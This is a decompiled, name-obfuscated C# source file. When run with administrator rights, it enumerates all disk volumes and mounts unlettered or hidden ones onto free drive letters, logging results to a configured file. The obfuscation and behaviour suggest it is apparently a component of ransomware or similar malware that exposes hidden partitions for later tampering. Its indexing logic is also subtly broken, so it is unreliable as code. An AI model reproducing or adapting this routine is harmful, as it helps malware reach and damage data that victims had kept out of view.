using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace vQzMGKHeycFziMq;

public static class aZrdpiZJwtSJIHi
{
	public enum MXprhmPjCNN : uint
	{
		czTzaZOFVbe,
		LhIqZYYkfa,
		nMhOhkWOybee,
		oYaLiUFYRGf,
		OoDTYTwUvvi,
		kLnfOHRLeX,
		oRBlJgIrrtor
	}

	[CompilerGenerated]
	private sealed class eMvbBmhwhJoTAxBE
	{
		public uint rRxdYaECNchadbP;

		public uint uocbKUOTTvrDiG;

		public char[] xkVMIuvnZVmU;

		public bool _003CMountVolumes_003Eb__0(string volumeName)
		{
			if (GetVolumePathNamesForVolumeNameW(volumeName, xkVMIuvnZVmU, uocbKUOTTvrDiG, ref rRxdYaECNchadbP))
			{
				return xkVMIuvnZVmU.Length != 3;
			}
			return true;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern MXprhmPjCNN GetDriveType([MarshalAs(UnmanagedType.LPStr)] string FbgRIhbvBEe);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string wSEUbXMArBD, char[] hTPUDRqyQXbIkc, uint ephXdLTcONGyZOOoi, ref uint BiMxgmbmKWYkHr);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string eCiUywFinprT, string mSvPclFgkTdDn);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder hzMsSmhBOwfm, int POJPsMNfOCMI);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int nLxDRFBNicfQ, StringBuilder ZLSyufCiuIUWH, int GauLfdtOBnVq);

	public static List<string> LxiGSGIRkrsLQu()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int nLxDRFBNicfQ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(nLxDRFBNicfQ, stringBuilder, 1024));
		return list;
	}

	public static void hPWtNZjkCEaxdhv()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			string[] array = new string[26]
			{
				"Q:\\", "W:\\", "E:\\", "R:\\", "T:\\", "Y:\\", "U:\\", "I:\\", "O:\\", "P:\\",
				"A:\\", "S:\\", "D:\\", "F:\\", "G:\\", "H:\\", "J:\\", "K:\\", "L:\\", "Z:\\",
				"X:\\", "C:\\", "V:\\", "B:\\", "N:\\", "M:\\"
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == MXprhmPjCNN.LhIqZYYkfa)
				{
					array2[num++] = text;
				}
			}
			List<string> source = LxiGSGIRkrsLQu();
			uint rRxdYaECNchadbP = 0u;
			uint uocbKUOTTvrDiG = 120u;
			char[] xkVMIuvnZVmU = new char[260];
			foreach (string item in source.Where((string volumeName) => !GetVolumePathNamesForVolumeNameW(volumeName, xkVMIuvnZVmU, uocbKUOTTvrDiG, ref rRxdYaECNchadbP) || xkVMIuvnZVmU.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (yzZnBHwSsJOOcf.MFBaFacYIYTeS)
				{
					try
					{
						Console.WriteLine("Drive Mounted: {0}", array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (yzZnBHwSsJOOcf.dwCcrxocWgDvY)
			{
				try
				{
					File.AppendAllText(yzZnBHwSsJOOcf.HXSuIBiFjcFlYv, "Error while mounting network drives: " + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
